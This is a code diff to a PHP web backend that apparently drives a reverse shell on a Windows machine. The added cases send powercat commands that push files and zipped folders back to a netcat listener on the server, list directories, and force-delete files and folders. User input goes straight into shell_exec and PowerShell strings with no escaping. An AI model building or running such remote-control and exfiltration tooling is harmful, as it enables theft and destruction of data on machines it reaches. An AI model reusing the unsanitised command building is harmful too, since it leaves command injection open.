@@ -105,14 +105,71 @@ if (isset($_POST['action'])) {
         case "download":
             error_log("Received download action");
             session_write_close();
-            shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/test.pdf &");
+            $filePath = $_POST['command'];
+            shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/" . basename($filePath) ." &");
             sleep(1);
-            $fileToDownload = "/home/pierre/Documents/psl_lrm.pdf";
-            $cmd = 'start-job -ScriptBlock {. ' . $powercatFolder . '/powercat.ps1; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $fileToDownload . '}';
+            $cmd = 'start-job -ScriptBlock {. ' . $powercatFolder . '/powercat.ps1; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' 
+                . $fileTransferPort . ' -i ' . $filePath . '}';
             $handle = fopen("../cmd/command", 'w') or die('Cannot open file: ../cmd/command');
             fwrite($handle, $cmd);
             fclose($handle);  
             // echo "saving file";
+        break;
+
+        case "downloadZip":
+            error_log("Received downloadZip action");
+            session_write_close();
+            $filePath = $_POST['command'];
+            $zipPath = "./" . basename($filePath) . ".zip";
+            shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/" . basename($filePath) .".zip &");
+            sleep(1);
+            $cmd = 'start-job -ScriptBlock {. ' . $powercatFolder . '/powercat.ps1; Compress-Archive -Path ' . $filePath . '-DestinationPath ' . $zipPath . '; 
+                powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $zipPath . '};';
+            // $cmd = 'start-job -ScriptBlock {. ' . $powercatFolder . '/powercat.ps1; Compress-Archive -Path ' . $filePath . '-DestinationPath ' . $zipPath . '; 
+            //     powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $zipPath . '}; Remove-Item -Path ' . $zipPath . '-Force;}';
+            $handle = fopen("../cmd/command", 'w') or die('Cannot open file: ../cmd/command');
+            fwrite($handle, $cmd);
+            fclose($handle);  
+            // echo "saving file";
+        break;
+
+        case "go":
+            error_log("Received go action");
+            $cmd = "cd " . $_POST['command'] . "; Get-ChildItem -Force";
+            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
+            $jsonData = new DirectoryData;
+            $jsonData->initFromReverseResult($result);
+            echo json_encode($jsonData);
+        break;
+
+        case "parent":
+            error_log("Received parent action");
+            $cmd = "cd .. ; Get-ChildItem -Force";
+            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
+            $jsonData = new DirectoryData;
+            $jsonData->initFromReverseResult($result);
+            echo json_encode($jsonData);
+        break;
+
+        case "delete":
+            error_log("Received delete action");
+            $cmd = "Remove-Item -Path" . $_POST['command'] . " -Force ; Get-ChildItem -Force";
+            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
+            $jsonData = new DirectoryData;
+            $jsonData->initFromReverseResult($result);
+            echo json_encode($jsonData);
+        break;
+        
+        case "deleteFolder":
+            error_log("Received deleteFolder action");
+            $cmd = "Remove-Item -Path" . $_POST['command'] . " -Recurse -Force ; Get-ChildItem -Force";
+            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
+            $jsonData = new DirectoryData;
+            $jsonData->initFromReverseResult($result);
+            echo json_encode($jsonData);
+        break;
+
+        case "print":
         break;
         
         case "init":
@@ -122,6 +179,7 @@ if (isset($_POST['action'])) {
             $powercatFolder = substr($result, 0, -2);
             echo $result;
         break;
+
         case "list":
             error_log("Received list action");
             $cmd = "Get-ChildItem -Force";
